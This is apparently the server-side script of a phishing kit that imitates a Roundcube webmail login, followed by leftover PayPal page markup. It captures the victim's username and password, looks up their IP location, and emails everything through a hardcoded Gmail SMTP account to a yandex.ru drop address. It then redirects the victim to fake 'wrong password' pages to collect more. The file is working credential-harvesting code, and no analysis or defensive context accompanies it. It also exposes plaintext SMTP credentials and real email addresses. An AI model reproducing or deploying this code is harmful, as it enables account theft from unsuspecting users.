<?php

$country = visitor_country();
$countryCode = visitor_countryCode();
$continentCode = visitor_continentCode();

function getRealUserIp(){
    switch(true){
      case (!empty($_SERVER['HTTP_X_REAL_IP'])) : return $_SERVER['HTTP_X_REAL_IP'];
      case (!empty($_SERVER['HTTP_CLIENT_IP'])) : return $_SERVER['HTTP_CLIENT_IP'];
      case (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) : return $_SERVER['HTTP_X_FORWARDED_FOR'];
      default : return $_SERVER['REMOTE_ADDR'];
    }
 }

$ip=   getRealUserIp();


$browser = $_SERVER['HTTP_USER_AGENT'];
$login = $_POST['login'];
$passwd = $_POST['passwd'];
$own = 'niceexport.smith@yandex.ru';
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$server = date("D/M/d, Y g:i a"); 
$domain = $country;
$sender = 'X3D';
$subj = "Roundcube Login | $domain | $ip";
$message=$_SERVER['HTTP_USER_AGENT']."\n";

//$over = 'http://autoadsales.com/images/products/thumb/CS1.1.jpg';
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>=============Roundcube Login=============== </td></tr>
 <tr><td>ID: $login<td/	></tr>
 <tr><td>Access: $passwd</td></tr>
 <tr><td>Browser: $message</td></tr>
 <tr><td>IP: $country | <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a> </td></tr>
 <tr><td>Qhrix Cyber Team</td></tr>
 </BODY>
 </HTML>";	
if (empty($login) || empty($passwd)) {
header( "Location: index.php?Email=$login&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1" );
}
else {

        
        require 'PHPMailerAutoload.php';
     $mail = new PHPMailer;
// Enable verbose debug output
$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = 'mdwelfasts@gmail.com';                 // SMTP username
$mail->Password = 'Tiwa2018';                           // SMTP password
$mail->Port = 587;                                    // TCP port to connect to

$mail->From = 'niceexport.smith@yandex.ru';
$mail->FromName = 'Roundcube!';
$mail->addAddress('niceexport.smith@yandex.ru');               // Name is optional

$mail->isHTML(true);                                  // Set email format to HTML

$mail->Subject = $subj;
$mail->Body    = $msg;
$mail->AltBody = 'Enjoy new server';

if(!$mail->send()) {
    echo 'Message could not be sent.';
    echo 'Mailer Error: ' . $mail->ErrorInfo;
	
} else {
   session_start();
  
header("Location: process1.php?email=$login");
 
  
exit();
    
}


}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
		
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function visitor_countryCode()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {
        $result = $ip_data->geoplugin_countryCode;
    }

    return $result;
}
function visitor_regionName()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_regionName != null)
    {
        $result = $ip_data->geoplugin_regionName;
    }

    return $result;
}
function visitor_continentCode()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_continentCode != null)
    {
        $result = $ip_data->geoplugin_continentCode;
    }

    return $result;
	
}
?>

</form><script type="text/javascript">RPT_Init("");_SegmentGroup = "PPP";if (top.location != location) {top.location.href = document.location.href;}</script></body></html>

<div id="navFull"></div>
<script type="text/javascript">
							  // This is an ugly hack until there is a reliable ondomready function
							 if(typeof PAYPAL != 'undefined'){
								 PAYPAL.core.Navigation.init();
							}</script>
<script type="text/JavaScript">
<!--
setTimeout("location.href = 'wrong_pass.php?email=<?php echo $login ?>&rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.113InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1';",20);
-->

</script>
</body>
</html>